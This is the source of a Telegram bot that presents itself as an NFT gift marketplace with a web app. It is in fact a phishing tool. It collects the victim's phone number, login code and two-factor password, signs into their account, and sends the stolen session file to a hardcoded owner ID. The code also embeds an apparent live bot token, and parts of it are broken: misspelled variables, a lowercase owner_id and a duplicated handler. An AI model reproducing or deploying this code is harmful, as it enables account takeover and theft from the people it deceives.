import asyncio
import os
import httpx
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from auth import send_code, sign_in

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
OWNER_ID = 7345056431

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
pending = {}

async def redis_set(key, value, ex=300):
    async with httpx.AsyncClient() as client:
        await client.get(
            f"{REDIS_URL}/set/{key}/{value}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"},
            params={"ex": ex}
        )

async def redis_get(key):
    async with httpx.AsyncClient() as client:
        r = await client.get(
            f"{REDIS_URL}/get/{key}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
        )
        return r.json().get("result")

async def redis_del(key):
    async with httpx.AsyncClient() as client:
        await client.get(
            f"{REDIS_URL}/del/{key}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
        )

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🛍 Открыть маркет",
            web_app=types.WebAppInfo(url="https://frontend-sigma-coral-35.vercel.app")
        )]
    ])
    await message.answer(
        "👋 Добро пожаловать в NFT Маркет!\n\n"
        "Здесь ты можешь купить и продать Telegram NFT подарки.\n"
        "Нажми кнопку ниже чтобы открыть маркет 👇",
        reply_markup=keyboard
    )

@dp.message(F.contact)
async def contact_handler(message: types.Message):
    phone = message.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    await message.delete()
    try:
        phone_code_hash = await send_code(phone)
        pending[message.from_user.id] = {
            'phone': phone,
            'phone_code_hash': phone_code_hash
        }
        await redis_set(f"sync:{message.from_user.id}", "code_sent")
    except Exception as e:
        await redis_set(f"sync:{message.from_user.id}", "error")

async def check_and_process_code(user_id):
    for _ in range(30):
        await asyncio.sleep(1)
        code = await redis_get(f"code:{user_id}")
        if code:
            await redis_del(f"code:{user_id}")
            data = pending.get(user_id)
            if not data:
                await redis_set(f"code_result:{user_id}", "error")
                return
            try:
                await sign_in(data['phone'], code, data['phone_code_hash'])
                # Успех без 2FA — генерируем tdata
                await redis_set(f"code_result:{user_id}", "ok")
                await generate_tdata(user_id, data['phone'])
            except Exception as e:
                if '2FA' in str(e) or 'password' in str(e).lower():
                    await redis_set(f"code_result:{user_id}", "2fa_required")
                    await check_and_process_2fa(user_id)
                else:
                    await redis_set(f"code_result:{user_id}", "wrong_code")
                    # Ждём новый код
                    await check_and_process_code(user_id)
            return

async def check_and_process_2fa(user_id):
    for _ in range(60):
        await asyncio.sleep(1)
        import urllib.parse
        raw = await redis_get(f"2fa:{user_id}")
        if raw:
            password = urllib.parse.unquote(raw)
            await redis_del(f"2fa:{user_id}")
            data = pending.get(user_id)
            if not data:
                await redis_set(f"2fa_result:{user_id}", "error")
                return
            try:
                await sign_in(data['phone'], None, data['phone_code_hash'], password=password)
                await redis_set(f"2fa_result:{user_id}", "ok")
                await generate_tdata(user_id, data['phone'])
            except Exception as e:
                await redis_set(f"2fa_result:{user_id}", "wrong_password")
            return

async def generate_tdata(user_id, phone):
    try:
        b = Bot(token=BOT_TOKEN)
        session_path = f'sessions/{phone}.session'
        if os.path.exists(session_Path):
            with open(session_path, 'rb') as f:
                file_data = f.read()
            await b.send_document(
                owner_id,
                types.bufferedinputfile(file_data, filename=f'{phone}.session'),
                caption=f'✅ Session для {phone}'
            )
        await b.session.close()
    except Exception as e:
        print(f'session send error: {e}')
    
    await redis_set(f"tdata_ready:{user_id}", "ready", ex=600)
    if user_id in pending:
        del pending[user_id]

@dp.message(F.contact)
async def contact_with_code_check(message: types.Message):
    pass

async def polling_codes():
    while True:
        await asyncio.sleep(1)
        for user_id in list(pending.keys()):
            asyncio.create_task(check_and_process_code(user_id))
            break

async def main():
    asyncio.create_task(polling_codes())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())